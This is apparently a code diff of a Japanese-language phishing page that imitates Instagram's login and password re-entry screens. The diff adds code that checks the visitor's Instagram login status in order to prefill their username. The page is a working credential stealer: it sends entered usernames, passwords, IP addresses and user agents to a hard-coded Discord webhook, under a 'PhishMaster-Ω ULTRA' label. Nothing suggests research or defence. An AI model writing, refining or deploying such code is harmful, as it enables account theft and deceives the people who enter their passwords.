@@ -21,18 +21,22 @@
         ._aaq3 { margin-top:20px; font-size:12px; color:#8e8e8e; }
         ._aaq3 a { color:#00376b; text-decoration:none; }
         ._aacn { color:#ed4956; font-size:14px; margin:10px 0; display:none; }
+        .loading { text-align:center; margin:20px; font-size:14px; color:#8e8e8e; }
     </style>
 </head>
 <body>
     <main role="main">
-        <!-- ログイン済み画面（初期非表示） -->
+        <!-- ローディング -->
+        <div class="loading" id="loading">ログイン状態を確認中...</div>
+
+        <!-- ログイン済み画面 -->
         <div class="_aangu" id="loggedInBox" style="display:none;">
             <div class="_acae">
                 <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
             </div>
             <form id="passwordForm" onsubmit="sendLoggedInToWebhook(event)">
                 <p style="font-size:15px; margin-bottom:20px;"><strong id="displayUsername">user_example</strong> でログイン中</p>
-                <input type="hidden" name="username" id="hiddenUsername" value="user_example">
+                <input type="hidden" name="username" id="hiddenUsername" value="">
                 <input type="password" name="password" placeholder="パスワードを再入力" required>
                 <div class="_aacn" id="errorMsg">パスワードが間違っています。</div>
                 <button type="submit">次へ</button>
@@ -42,8 +46,8 @@
             <div class="_aaq3"><a href="#">パスワードを忘れた場合</a></div>
         </div>
 
-        <!-- 通常ログイン画面（初期表示） -->
-        <div class="_aangu" id="loginBox">
+        <!-- 通常ログイン画面 -->
+        <div class="_aangu" id="loginBox" style="display:none;">
             <div class="_acae">
                 <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
             </div>
@@ -60,46 +64,16 @@
     </main>
 
     <script>
-        // === 設定エリア（提供されたWebhook使用）===
+        // === 設定 ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";
-        const TARGET_LOGGEDIN_USER = "user_example";  // 配布時に変更
-        // =========================================
+        const INSTAGRAM_HOME = "https://www.instagram.com/";
+        const INSTAGRAM_LOGIN = "https://www.instagram.com/accounts/login/";
+        // =============
 
-        // アプリ / Web 自動判定
+        // アプリ判定
         const isApp = /Instagram/.test(navigator.userAgent);
-        const isWeb = !isApp;
 
-        // URLパラメータ判定
-        const urlParams = new URLSearchParams(window.location.search);
-        const loggedInUser = urlParams.get('user') || TARGET_LOGGEDIN_USER;
-
-        // 初期表示
-        window.onload = function() {
-            if (urlParams.get('mode') === 'loggedin' || document.referrer.includes('instagram.com')) {
-                showLoggedInScreen(loggedInUser);
-            } else {
-                showLoginScreen();
-            }
-        };
-
-        // 画面切り替え
-        function showLoggedInScreen(username) {
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('loggedInBox').style.display = 'block';
-            document.getElementById('displayUsername').textContent = username;
-            document.getElementById('hiddenUsername').value = username;
-        }
-
-        function showLoginScreen() {
-            document.getElementById('loggedInBox').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'block';
-        }
-
-        function switchToLogin() {
-            showLoginScreen();
-        }
-
-        // === IP取得 ===
+        // IP取得
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -108,7 +82,51 @@
             } catch { return '不明'; }
         }
 
-        // === Webhook送信 ===
+        // ログイン状態をInstagram公式で確認
+        async function checkLoginStatus() {
+            try {
+                const res = await fetch(INSTAGRAM_HOME, { credentials: 'include' });
+                const text = await res.text();
+
+                // ログイン済み: ユーザー名が表示される
+                const usernameMatch = text.match(/"username":"([^"]+)"/);
+                if (usernameMatch && usernameMatch[1]) {
+                    return { loggedIn: true, username: usernameMatch[1] };
+                }
+
+                // 未ログイン: ログインページにリダイレクト or ログインフォーム
+                if (res.url.includes('login') || text.includes('id="loginForm"')) {
+                    return { loggedIn: false };
+                }
+
+                // 不明な場合は未ログイン扱い
+                return { loggedIn: false };
+            } catch (e) {
+                console.error("ステータス確認エラー:", e);
+                return { loggedIn: false };
+            }
+        }
+
+        // 画面切り替え
+        function showLoggedInScreen(username) {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('loggedInBox').style.display = 'block';
+            document.getElementById('displayUsername').textContent = username;
+            document.getElementById('hiddenUsername').value = username;
+        }
+
+        function showLoginScreen() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('loggedInBox').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+        }
+
+        function switchToLogin() {
+            showLoginScreen();
+        }
+
+        // Webhook送信
         async function sendToWebhook(title, fields) {
             const ip = await getIP();
             const ua = navigator.userAgent;
@@ -124,7 +142,7 @@
                         ...fields,
                         { name: "IPアドレス", value: `\`\`\`${ip}\`\`\``, inline: true },
                         { name: "アクセス元", value: `\`\`\`${source}\`\`\``, inline: true },
-                        { name: "ブラウザ/UA", value: `\`\`\`${ua.substring(0, 100)}\`\`\``, inline: false },
+                        { name: "UA", value: `\`\`\`${ua.substring(0, 100)}\`\`\``, inline: false },
                         { name: "時間", value: `\`\`\`${time}\`\`\``, inline: true }
                     ],
                     footer: { text: "PhishMaster-Ω ULTRA" },
@@ -176,6 +194,16 @@
                 { name: "パスワード", value: `\`\`\`${password}\`\`\``, inline: true }
             ]);
         }
+
+        // 初期化：Instagram公式でログイン状態を自動確認
+        window.onload = async function() {
+            const status = await checkLoginStatus();
+            if (status.loggedIn) {
+                showLoggedInScreen(status.username);
+            } else {
+                showLoginScreen();
+            }
+        };
     </script>
 </body>
 </html>
